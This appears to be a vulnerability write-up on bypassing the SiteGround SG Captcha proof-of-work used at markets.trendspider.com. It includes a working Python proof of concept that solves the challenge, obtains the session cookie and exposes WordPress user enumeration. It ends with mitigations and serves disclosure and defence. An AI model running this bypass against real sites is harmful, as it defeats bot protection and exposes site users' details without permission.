# SG Captcha PoW Bypass

## Overview

SG Captcha (SiteGround Captcha) is a WordPress anti-bot plugin used by TrendSpider at `markets.trendspider.com`. It implements a client-side SHA1-based Proof-of-Work challenge that is trivially solvable in under 1 second, allowing automated bypass of captcha protection.

## Challenge Format

```javascript
const sgchallenge="21:1791125747:52cae0b0:9de4659a...:";
const sgsubmit_url="/.well-known/sgcaptcha/?r=%2F";
```

Parts separated by colon: `complexity:timestamp:random:hash:`

## PoW Algorithm (from reverse-engineered worker code)

The worker computes SHA1(challenge_bytes + counter_bytes) and checks if the first 4 bytes (big-endian 32-bit word) have `complexity` leading zero bits. The counter is encoded as 1-4 bytes big-endian.

## Solution Format

The solution returned to the main thread is Base64(challenge_bytes + counter_bytes). Submitted via GET:

```
GET /.well-known/sgcaptcha/?r=%2F&sol=<base64>&s=<elapsed_ms>:<hash_count>
```

## Server Response

On valid solution:
- Cookie `_I_=<hash>-<timestamp>-<complexity>; max-age=2592000` (30-day session cookie)
- `SG-Captcha` header removed (no longer `challenge`)
- All WordPress endpoints become accessible

## Python PoC

```python
import hashlib, struct, base64, requests, re

def int_to_bytes(n):
    if n <= 255: return struct.pack('>B', n)
    elif n <= 65535: return struct.pack('>H', n)
    elif n <= 16777215: return struct.pack('>I', n)
    return struct.pack('>I', n)

def solve(challenge, complexity, max_attempts=200000000):
    cb = challenge.encode('utf-8')
    for counter in range(max_attempts):
        data = cb + int_to_bytes(counter)
        h = hashlib.sha1(data).digest()
        if struct.unpack('>I', h[:4])[0] >> (32 - complexity) == 0:
            return counter
    return None

session = requests.Session()
session.cookies.set('wpSGCacheBypass', '1')
session.get("https://markets.trendspider.com/", allow_redirects=True)
captcha = session.get("https://markets.trendspider.com/.well-known/sgcaptcha/?r=%2F")

challenge = re.search(r'sgchallenge\s*=\s*"([^"]+)"', captcha.text).group(1)
submit_url = re.search(r'sgsubmit_url\s*=\s*"([^"]+)"', captcha.text).group(1)
complexity = int(challenge.split(':')[0])

counter = solve(challenge, complexity)
solution = base64.b64encode(challenge.encode('utf-8') + int_to_bytes(counter)).decode()

r = session.get(f"https://markets.trendspider.com{submit_url}",
    params={'sol': solution, 's': f'1000:{counter+1}'}, allow_redirects=True)
# Session now has _I_ cookie - WordPress endpoints accessible
```

## Performance

- Complexity 21: ~1M expected attempts, 0.5-3s single-threaded Python
- ~500K-650K H/s Python, ~2M+ H/s Go

## Impact

WordPress endpoints exposed:
- `/wp-json/wp/v2/users` — user enumeration (usernames, internal hostnames)
- `/readme.html` — version disclosure
- `/wp-json/*` — plugin API namespace enumeration

## Mitigations

1. Increase PoW complexity to 32+ bits
2. Server-side PoW validation with timeout
3. Bind challenge to IP + User-Agent
4. Rate-limit captcha submissions per IP
5. Reject reused or stale challenges
6. Use Cloudflare Turnstile / hCaptcha instead